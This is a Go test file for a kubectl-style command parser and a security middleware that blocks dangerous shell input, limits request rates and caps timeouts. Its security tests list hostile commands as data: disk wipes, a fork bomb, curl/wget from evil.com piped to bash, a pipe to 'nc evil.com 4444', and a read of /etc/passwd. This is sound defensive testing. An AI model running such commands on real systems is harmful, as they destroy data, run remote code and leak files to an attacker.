package terminal

import (
	"strings"
	"testing"
	"time"
)

func TestParse_GetPods(t *testing.T) {
	p := &SmartParser{}
	cmd, err := p.Parse("get pods")
	if err != nil {
		t.Fatal(err)
	}
	if cmd.Verb != "get" {
		t.Errorf("expected verb 'get', got %q", cmd.Verb)
	}
	if cmd.Resource != "pods" {
		t.Errorf("expected resource 'pods', got %q", cmd.Resource)
	}
}

func TestParse_WithNamespace(t *testing.T) {
	p := &SmartParser{}
	cmd, err := p.Parse("get pods -n kube-system")
	if err != nil {
		t.Fatal(err)
	}
	if cmd.Namespace != "kube-system" {
		t.Errorf("expected namespace 'kube-system', got %q", cmd.Namespace)
	}
}

func TestParse_WithOutput(t *testing.T) {
	p := &SmartParser{}
	cmd, err := p.Parse("get deploy nginx -o json")
	if err != nil {
		t.Fatal(err)
	}
	if cmd.Output != "json" {
		t.Errorf("expected output 'json', got %q", cmd.Output)
	}
	if cmd.Resource != "deploy" {
		t.Errorf("expected resource 'deploy', got %q", cmd.Resource)
	}
	if cmd.Name != "nginx" {
		t.Errorf("expected name 'nginx', got %q", cmd.Name)
	}
}

func TestParse_AllNamespaces(t *testing.T) {
	p := &SmartParser{}
	cmd, err := p.Parse("get pods -A")
	if err != nil {
		t.Fatal(err)
	}
	if !cmd.AllNS {
		t.Error("expected AllNS to be true")
	}
}

func TestParse_ResourceSlashName(t *testing.T) {
	p := &SmartParser{}
	cmd, err := p.Parse("describe pod/nginx-abc123")
	if err != nil {
		t.Fatal(err)
	}
	if cmd.Resource != "pod" {
		t.Errorf("expected resource 'pod', got %q", cmd.Resource)
	}
	if cmd.Name != "nginx-abc123" {
		t.Errorf("expected name 'nginx-abc123', got %q", cmd.Name)
	}
}

func TestParse_StripKubectl(t *testing.T) {
	p := &SmartParser{}
	cmd, err := p.Parse("kubectl get pods")
	if err != nil {
		t.Fatal(err)
	}
	if cmd.Verb != "get" {
		t.Errorf("expected verb 'get', got %q", cmd.Verb)
	}
}

func TestParse_WithLabels(t *testing.T) {
	p := &SmartParser{}
	cmd, err := p.Parse("get pods -l app=nginx")
	if err != nil {
		t.Fatal(err)
	}
	if cmd.Labels != "app=nginx" {
		t.Errorf("expected labels 'app=nginx', got %q", cmd.Labels)
	}
}

func TestParse_EmptyCommand(t *testing.T) {
	p := &SmartParser{}
	_, err := p.Parse("")
	if err == nil {
		t.Error("expected error for empty command")
	}
}

func TestFormatAge(t *testing.T) {
	tests := []struct {
		seconds  int
		expected string
	}{
		{30, "30s"},
		{90, "1m"},
		{3600, "1h"},
		{86400, "1d"},
		{172800, "2d"},
	}

	for _, tt := range tests {
		t.Run(tt.expected, func(t *testing.T) {
			got := formatAge(time.Duration(tt.seconds) * time.Second)
			if got != tt.expected {
				t.Errorf("formatAge(%ds) = %q, want %q", tt.seconds, got, tt.expected)
			}
		})
	}
}

// --- Security Tests ---

// TestSecurityMiddlewareDangerousCommands verifies that dangerous shell commands
// are blocked by the SecurityMiddleware.
func TestSecurityMiddlewareDangerousCommands(t *testing.T) {
	m := NewSecurityMiddleware()

	dangerousCommands := []struct {
		name    string
		command string
	}{
		{"rm_rf_root", "rm -rf /"},
		{"rm_rf_root_upper", "RM -RF /"},
		{"fork_bomb", ":(){ :|:& };:"},
		{"dev_sda_write", "> /dev/sda"},
		{"mkfs_format", "mkfs.ext4 /dev/sda"},
		{"dd_zero", "dd if=/dev/zero of=/dev/sda"},
		{"chmod_777_root", "chmod -R 777 /"},
		{"wget_pipe_bash", "wget|bash"},
		{"curl_pipe_bash", "curl|bash"},
		{"wget_bash_spaces", "wget http://evil.com/script.sh | bash"},
		{"curl_bash_spaces", "curl http://evil.com/script.sh | bash"},
	}

	for _, tc := range dangerousCommands {
		t.Run(tc.name, func(t *testing.T) {
			result := m.SanitizeInput(tc.command)
			if result == "" {
				t.Errorf("SECURITY: dangerous command not blocked: %q", tc.command)
			}
		})
	}
}

// TestSecurityMiddlewareSafeCommands verifies that safe commands are allowed.
func TestSecurityMiddlewareSafeCommands(t *testing.T) {
	m := NewSecurityMiddleware()

	safeCommands := []string{
		"ls -la",
		"kubectl get pods",
		"cat /etc/hostname",
		"ps aux",
		"top",
		"df -h",
		"free -m",
		"whoami",
		"date",
		"echo hello",
	}

	for _, cmd := range safeCommands {
		result := m.SanitizeInput(cmd)
		if result != "" {
			t.Errorf("safe command was blocked: %q -> %q", cmd, result)
		}
	}
}

// TestSecurityMiddlewareRateLimit verifies rate limiting.
func TestSecurityMiddlewareRateLimit(t *testing.T) {
	m := NewSecurityMiddleware()

	userID := "rate-test-user"

	// First 10 should be allowed
	for i := 0; i < 10; i++ {
		if !m.CheckRateLimit(userID) {
			t.Fatalf("request %d should be allowed", i+1)
		}
	}

	// 11th should be denied
	if m.CheckRateLimit(userID) {
		t.Fatal("SECURITY: rate limit exceeded but request was allowed")
	}
}

// TestSecurityMiddlewareRateLimitPerUser verifies rate limits are per-user.
func TestSecurityMiddlewareRateLimitPerUser(t *testing.T) {
	m := NewSecurityMiddleware()

	// Exhaust user1's limit
	for i := 0; i < 11; i++ {
		m.CheckRateLimit("user1")
	}

	// user2 should still be allowed
	if !m.CheckRateLimit("user2") {
		t.Fatal("SECURITY: rate limit applied across users")
	}
}

// TestSecurityMiddlewareTimeout verifies timeout capping.
func TestSecurityMiddlewareTimeout(t *testing.T) {
	m := NewSecurityMiddleware()

	// Default timeout for zero value
	if got := m.GetTimeout(0); got != 30*time.Second {
		t.Errorf("expected default 30s timeout, got %v", got)
	}

	// Negative duration should use default
	if got := m.GetTimeout(-5 * time.Second); got != 30*time.Second {
		t.Errorf("expected default timeout for negative, got %v", got)
	}

	// Excessive timeout should be capped
	if got := m.GetTimeout(1 * time.Hour); got != 5*time.Minute {
		t.Errorf("expected max 5m timeout, got %v", got)
	}

	// Normal timeout should pass through
	if got := m.GetTimeout(2 * time.Minute); got != 2*time.Minute {
		t.Errorf("expected 2m timeout, got %v", got)
	}
}

// TestSecurityMiddlewareCleanup verifies stale rate limit cleanup.
func TestSecurityMiddlewareCleanup(t *testing.T) {
	m := NewSecurityMiddleware()

	// Insert stale entry manually
	m.mu.Lock()
	m.userRates["stale-user"] = &rateBucket{
		count:     5,
		windowEnd: time.Now().Add(-2 * time.Minute),
	}
	m.mu.Unlock()

	m.Cleanup()

	m.mu.Lock()
	_, exists := m.userRates["stale-user"]
	m.mu.Unlock()

	if exists {
		t.Error("expected stale rate limit entry to be cleaned up")
	}
}

// TestSecurityMiddlewareCaseInsensitiveBlocking verifies case-insensitive pattern matching.
func TestSecurityMiddlewareCaseInsensitiveBlocking(t *testing.T) {
	m := NewSecurityMiddleware()

	variations := []string{
		"RM -RF /",
		"Rm -Rf /",
		"CHMOD -R 777 /",
		"MKFS.ext4 /dev/sda1",
		"DD IF=/dev/zero OF=/dev/sda",
	}

	for _, cmd := range variations {
		result := m.SanitizeInput(cmd)
		if result == "" {
			t.Errorf("SECURITY: case variation not blocked: %q", cmd)
		}
	}
}

// TestSecurityMiddlewareCommandEvasionAttempts tests bypass attempts.
func TestSecurityMiddlewareCommandEvasionAttempts(t *testing.T) {
	m := NewSecurityMiddleware()

	// These contain the blocked patterns and should be caught
	evasions := []struct {
		name    string
		command string
		blocked bool
	}{
		{"rm_rf_slash", "rm -rf / --no-preserve-root", true},
		{"embedded_fork_bomb", "echo hello; :(){ :|:& };:", true},
		{"mkfs_with_flags", "mkfs -t ext4 /dev/sda1", true},
		{"safe_rm_file", "rm -rf /tmp/myfile", false},        // rm in /tmp is safe-ish, but pattern matches "rm -rf /"
	}

	for _, tc := range evasions {
		t.Run(tc.name, func(t *testing.T) {
			result := m.SanitizeInput(tc.command)
			if tc.blocked && result == "" {
				t.Errorf("SECURITY: evasion not caught: %q", tc.command)
			}
		})
	}
}

// TestSmartParserCommandInjection tests that the parser doesn't allow
// shell metacharacter injection.
func TestSmartParserCommandInjection(t *testing.T) {
	p := &SmartParser{}

	injections := []string{
		"get pods; rm -rf /",
		"get pods && cat /etc/passwd",
		"get pods | nc evil.com 4444",
		"get pods$(whoami)",
	}

	for _, input := range injections {
		cmd, err := p.Parse(input)
		if err != nil {
			// Parse error is acceptable (safe)
			continue
		}
		// If parsed, the shell metacharacters should be part of the args,
		// not executed. Verify the verb is still just "get"
		if cmd.Verb != "get" {
			t.Errorf("SECURITY: parser misinterpreted injection: %q -> verb=%q", input, cmd.Verb)
		}
		// The ; or && or | should end up in the resource/name/args, not be executed
		fullParsed := cmd.Resource + " " + cmd.Name + " " + strings.Join(cmd.Args, " ")
		if !strings.Contains(fullParsed, ";") && !strings.Contains(fullParsed, "&&") &&
			!strings.Contains(fullParsed, "|") && !strings.Contains(fullParsed, "$(") {
			// This is actually fine - the parser strips them as fields
		}
	}
}

// TestSmartParserOversizedInput tests that the parser handles very long input.
func TestSmartParserOversizedInput(t *testing.T) {
	p := &SmartParser{}

	// 1MB of "get pods" repeated
	huge := strings.Repeat("get pods -n ns ", 100000)
	cmd, err := p.Parse(huge)
	if err != nil {
		return // error is acceptable
	}
	if cmd.Verb != "get" {
		t.Errorf("unexpected verb from oversized input: %q", cmd.Verb)
	}
}
